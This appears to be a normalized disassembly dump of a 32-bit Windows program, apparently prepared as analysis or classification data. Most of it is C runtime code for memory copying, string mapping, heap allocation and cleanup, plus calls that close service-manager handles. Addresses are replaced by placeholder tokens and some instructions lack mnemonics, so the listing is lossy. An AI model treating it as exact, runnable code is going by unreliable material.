mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_406ef0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40708c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406ef0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406ef0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406ef0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40708c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40708c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40708c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_4070e1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_40689c
pop ecx
sub_407101
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_405b59
mov [ eax ] 0x16
call sub_405ad0
or eax 0xffffffff
pop ebp
retn
sub_40713d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_4070e1
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_407491
pop ecx
cmp eax ebx
je r-xdata
call sub_407c40
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_4070e1
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_407491
pop ecx
cmp eax ebx
je r-xdata
call sub_407c40
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_407324
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4060c6
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40713d
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40736a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40382c
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_403840
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_4070e1
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_407491
pop ecx
cmp eax ebx
je r-xdata
call sub_407c40
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_407451
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4060c6
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40736a
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_407491
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_405aef
pop ecx
call sub_405b59
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_404757
push 0x1e
call sub_4045a8
push 0xff
call sub_4042c2
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_405b59
mov [ eax ] esi
push ebx
call sub_405aef
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_405b59
mov [ eax ] esi
sub_407525
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_405b59
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_405aef
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_4075a7
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_407491
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40689c
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_405aef
pop ecx
call sub_405b59
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_405b59
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405b17
pop ecx
mov [ esi ] eax
push esi
call sub_405aef
pop ecx
test eax eax
je r-xdata
call sub_405b59
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405b17
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_407654
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_40689c
push [ esi + 0x8 ]
call sub_40689c
push [ esi + 0xc ]
call sub_40689c
push [ esi + 0x10 ]
call sub_40689c
push [ esi + 0x14 ]
call sub_40689c
push [ esi + 0x18 ]
call sub_40689c
push [ esi ]
call sub_40689c
push [ esi + 0x20 ]
call sub_40689c
push [ esi + 0x24 ]
call sub_40689c
push [ esi + 0x28 ]
call sub_40689c
push [ esi + 0x2c ]
call sub_40689c
push [ esi + 0x30 ]
call sub_40689c
push [ esi + 0x34 ]
call sub_40689c
push [ esi + 0x1c ]
call sub_40689c
push [ esi + 0x38 ]
call sub_40689c
push [ esi + 0x3c ]
call sub_40689c
add esp 0x40
push [ esi + 0x40 ]
call sub_40689c
push [ esi + 0x44 ]
call sub_40689c
push [ esi + 0x48 ]
call sub_40689c
push [ esi + 0x4c ]
call sub_40689c
push [ esi + 0x50 ]
call sub_40689c
push [ esi + 0x54 ]
call sub_40689c
push [ esi + 0x58 ]
call sub_40689c
push [ esi + 0x5c ]
call sub_40689c
push [ esi + 0x60 ]
call sub_40689c
push [ esi + 0x64 ]
call sub_40689c
push [ esi + 0x68 ]
call sub_40689c
push [ esi + 0x6c ]
call sub_40689c
push [ esi + 0x70 ]
call sub_40689c
push [ esi + 0x74 ]
call sub_40689c
push [ esi + 0x78 ]
call sub_40689c
push [ esi + 0x7c ]
call sub_40689c
add esp 0x40
push [ esi + 0x80 ]
call sub_40689c
push [ esi + 0x84 ]
call sub_40689c
push [ esi + 0x88 ]
call sub_40689c
push [ esi + 0x8c ]
call sub_40689c
push [ esi + 0x90 ]
call sub_40689c
push [ esi + 0x94 ]
call sub_40689c
push [ esi + 0x98 ]
call sub_40689c
push [ esi + 0x9c ]
call sub_40689c
push [ esi + 0xa0 ]
call sub_40689c
push [ esi + 0xa4 ]
call sub_40689c
push [ esi + 0xa8 ]
call sub_40689c
push [ esi + 0xbc ]
call sub_40689c
push [ esi + 0xc0 ]
call sub_40689c
push [ esi + 0xc4 ]
call sub_40689c
push [ esi + 0xc8 ]
call sub_40689c
push [ esi + 0xcc ]
call sub_40689c
add esp 0x40
push [ esi + 0xd0 ]
call sub_40689c
push [ esi + 0xb8 ]
call sub_40689c
push [ esi + 0xd8 ]
call sub_40689c
push [ esi + 0xdc ]
call sub_40689c
push [ esi + 0xe0 ]
call sub_40689c
push [ esi + 0xe4 ]
call sub_40689c
push [ esi + 0xe8 ]
call sub_40689c
push [ esi + 0xec ]
call sub_40689c
push [ esi + 0xd4 ]
call sub_40689c
push [ esi + 0xf0 ]
call sub_40689c
push [ esi + 0xf4 ]
call sub_40689c
push [ esi + 0xf8 ]
call sub_40689c
push [ esi + 0xfc ]
call sub_40689c
push [ esi + 0x100 ]
call sub_40689c
push [ esi + 0x104 ]
call sub_40689c
push [ esi + 0x108 ]
call sub_40689c
add esp 0x40
push [ esi + 0x10c ]
call sub_40689c
push [ esi + 0x110 ]
call sub_40689c
push [ esi + 0x114 ]
call sub_40689c
push [ esi + 0x118 ]
call sub_40689c
push [ esi + 0x11c ]
call sub_40689c
push [ esi + 0x120 ]
call sub_40689c
push [ esi + 0x124 ]
call sub_40689c
push [ esi + 0x128 ]
call sub_40689c
push [ esi + 0x12c ]
call sub_40689c
push [ esi + 0x130 ]
call sub_40689c
push [ esi + 0x134 ]
call sub_40689c
push [ esi + 0x138 ]
call sub_40689c
push [ esi + 0x13c ]
call sub_40689c
push [ esi + 0x140 ]
call sub_40689c
push [ esi + 0x144 ]
call sub_40689c
push [ esi + 0x148 ]
call sub_40689c
add esp 0x40
push [ esi + 0x14c ]
call sub_40689c
push [ esi + 0x150 ]
call sub_40689c
push [ esi + 0x154 ]
call sub_40689c
push [ esi + 0x158 ]
call sub_40689c
push [ esi + 0x15c ]
call sub_40689c
push [ esi + 0x160 ]
call sub_40689c
add esp 0x18
sub_4079cb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
push esi
call sub_40689c
pop ecx
sub_407a34
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40689c
pop ecx
push esi
call sub_40689c
pop ecx
sub_403338
mov eax [ ebp - 0x1c ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
push eax
call [ CloseServiceHandle@IAT ]
retn
push eax
call [ CloseServiceHandle@IAT ]
sub_40346c
mov eax [ ebp - 0x1c ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
push eax
call [ CloseServiceHandle@IAT ]
retn
push eax
call [ CloseServiceHandle@IAT ]
sub_403bc6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_403af0
add esp 0xc
pop ebp
retn 0x4
sub_403bf9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_404225
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_403c2b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_403af0
add esp 0xc
pop ebp
retn 0x8
sub_403d9a
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_404790
pop ecx
pop ecx
retn
sub_403dae
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_404555
push eax
call sub_404530
sub_403dc8
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_405475
retn
_start
call sub_405489
jmp sub_403c6b
sub_403fa2
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_4040db
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_4041f9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_404130
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_404244
call eax
retn
sub_404289
push sub_404247
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_4042c2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404297
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_4042da
push 0x8
call sub_4056f0
pop ecx
retn
sub_4042e3
push 0x8
call sub_405617
pop ecx
retn
sub_404505
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_405617
pop ecx
sub_40451a
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_4043da
add esp 0xc
pop ebp
retn
sub_404530
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_4043da
add esp 0xc
pop ebp
retn
sub_404546
push 0x1
push 0x0
push 0x0
call sub_4043da
add esp 0xc
retn
sub_404555
push 0x1
push 0x1
push 0x0
call sub_4043da
add esp 0xc
retn
sub_404564
mov edi edi
push ebp
mov ebp esp
call sub_404757
push [ ebp + 0x8 ]
call sub_4045a8
pop ecx
push 0xff
call sub_404530
int3
sub_404f92
push 0x0
call [ EncodePointer@IAT ]
retn
sub_404f9b
call [ TlsAlloc@IAT ]
retn 0x4
sub_4050b7
push 0xd
call sub_405617
pop ecx
retn
sub_4050c0
push 0xc
call sub_405617
pop ecx
retn
sub_405276
push 0xd
call sub_405617
pop ecx
retn
sub_405282
push 0xc
call sub_405617
pop ecx
retn
sub_405406
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_405475
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40552c
push 0x8
push r--data
call sub_405430
call sub_405142
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_406d4d
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40554c
xor eax eax
inc eax
retn
sub_405565
push sub_40552c
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_405617
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4056e7
push 0xa
call sub_405617
pop ecx
retn
sub_405723
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_405778
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_4058ec
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_405617
pop ecx
sub_405928
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405937
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405946
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405ad0
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_405aa3
add esp 0x14
retn
sub_405ae0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405c89
call sub_4042e3
retn
sub_405c8f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_405c53
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_4061a0
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_40614d
add esp 0x10
pop ebp
retn
sub_406476
push 0xd
call sub_405617
pop ecx
retn
sub_406845
push 0xd
call sub_405617
pop ecx
retn
sub_40687e
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4066e4
pop ecx
mov [ rw-data ] 0x1
sub_406d41
push 0xc
call sub_405617
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_407134
push 0x2
call sub_404564
sub_407c40
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_4038c0
sub_407c56
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_4038c0
RtlUnwind
jmp [ RtlUnwind@IAT ]
